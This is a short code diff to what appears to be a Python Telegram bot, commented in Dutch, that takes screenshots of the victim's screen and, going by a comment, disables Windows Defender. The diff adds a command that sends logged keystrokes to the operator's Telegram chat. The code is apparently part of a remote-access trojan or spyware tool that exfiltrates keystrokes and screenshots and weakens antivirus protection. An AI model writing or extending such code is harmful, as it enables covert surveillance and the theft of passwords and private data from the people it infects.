@@ -32,6 +32,10 @@ async def ss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         caption='Screenshot of the main screen'
     )
 
+# key logged string sturen naar chat
+async def keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(key_log())
+
 # Windows defender uitzetten
 async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # meld dat Windows defender uit is
